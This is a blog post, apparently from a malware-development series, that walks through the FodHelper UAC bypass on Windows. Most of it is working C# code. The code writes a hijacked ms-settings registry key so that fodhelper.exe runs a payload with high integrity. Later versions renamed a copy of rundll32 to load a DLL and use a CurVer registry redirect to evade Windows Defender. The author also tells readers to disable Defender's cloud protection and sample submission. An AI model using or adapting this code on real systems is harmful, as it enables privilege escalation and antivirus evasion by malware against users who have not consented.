---
layout: post
title: Experimenting with the FodHelper UAC bypass
date: 2023-11-29
categories: [Malware Development, Evasion]
tags: [evasion]     
---


FodHelper is a Windows binary used to manage optional features. `fodhelper.exe` is vulnerable because it is a high-integrity process that interacts with the `HKEY_CURRENT_USER` registry hive, which we can control. One notable example of malware that uses `fodhelper.exe` to bypass User Account Control (UAC) and execute malicious activities is the TrickBot trojan.

When launched, FodHelper will search for the `(default)` value in the `HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command` registry key. This registry key does not exist by default, so if we create it and add the DelegateExecute property, it will execute our payload in a high-integrity context.

Let's try out a console app that will make `fodhelper.exe` execute our payload, marked as `<PAYLOAD>` 

> All of the projects created in this post are on my GitHub, check them out! Don't forget to turn off`Cloud-Delivered protection` and `Automatic sample submission`.
{: .prompt-info }


```csharp
using System.Diagnostics;
using Microsoft.Win32;

// Create the registry key
RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");

// Set the default value of the key
key.SetValue("", "<PAYLOAD>");

// Create the DelegateExecute property
key.SetValue("DelegateExecute", "", RegistryValueKind.String);

// Create a new process
Process process = new Process();

// Set the process start info
process.StartInfo.FileName = @"C:\Windows\System32\fodhelper.exe";

// Start the process
process.Start();
```

Let's substitute `<PAYLOAD>` for `powershell.exe`, build the code and try it out.

![Image 1](/assets/image1.png)

It seems like Windows Defender doesn't want to have executables in `(default)`. What if we try `powershell` instead of `powershell.exe`?...still doesn't work. Maybe `powershell "Start-Process powershell"`?...nope. If we can't get it to execute any commands, injecting a DLL into FodHelper is the next best thing. 

The easiest way to do this would be to make it execute `rundll32 <DLL_NAME>`. Since I don't think Defender would be too happy with us making FodHelper run a binary from `%windir%\system32`, let's make a copy of `run32dll`. Our payload should now be `C:\temp\luci C:\temp\payload.dll`. Let's apply these revisions to our code

```csharp
using System.Diagnostics;
using Microsoft.Win32;
// The full and improved code in this snippet above can be found on my GitHub
private const string Payload = "C:\temp\luci.exe C:\temp\payload.dll,DllMain";

// Copy run32dll.exe to luci.exe
File.Copy(@"C:\windows\system32\rundll32.exe", @"C:\temp\luci.exe");

// Create the registry key
RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");

// Set the default value of the key
key.SetValue("", Payload);

// Create the DelegateExecute property
key.SetValue("DelegateExecute", "", RegistryValueKind.String);

// Create a new process
Process process = new Process();

// Set the process start info
process.StartInfo.FileName = @"C:\Windows\System32\fodhelper.exe";

// Start the process
process.Start();
```

Having an evasive payload inside a DLL can be difficult, so let's see if this can be done any other way. What if we can somehow trick Defender into thinking the registry key has been untouched? Let's look it up.

![Image 2](/assets/image2.png)

Upon reading the documentation, I have stumbled upon this:


|CurVer |	Set the (Default) entry of this subkey to the most current version of this ProgID.Note: Unless you have side-by-side application versions, that is, multiple versions installed on the same system, you should avoid using CurVer.|
|--- |---|

***https://learn.microsoft.com/en-us/windows/win32/shell/fa-progids***

Looks fairly promising...let's see how it can be used. Consulting with StackExchange led me to this (post)[https://stackoverflow.com/questions/20974888/how-to-find-componentid-of-wscript-shell]. Finally, this should trick Defender into perceiving the registry untouched:

```csharp  
// Create the registry keys
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer", "", ".redirect");
Registry.SetValue(@"HKEY_CURRENT_USER\Software\Classes\.redirect\Shell\Open\command", "", <PAYLOAD>);

 // Start the process
Process process = new Process();
process.StartInfo.FileName = @"C:\Windows\System32\fodhelper.exe";
process.Start();

// Cleanup
System.Threading.Thread.Sleep(3000);
Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\ms-settings");
Registry.CurrentUser.DeleteSubKeyTree("Software\\Classes\\rekt");

```

And...this got caught by Defender again. So far, it seems like the only way to do this is using a DLL. I will update this post if I find any other method. 

Thanks for reading!
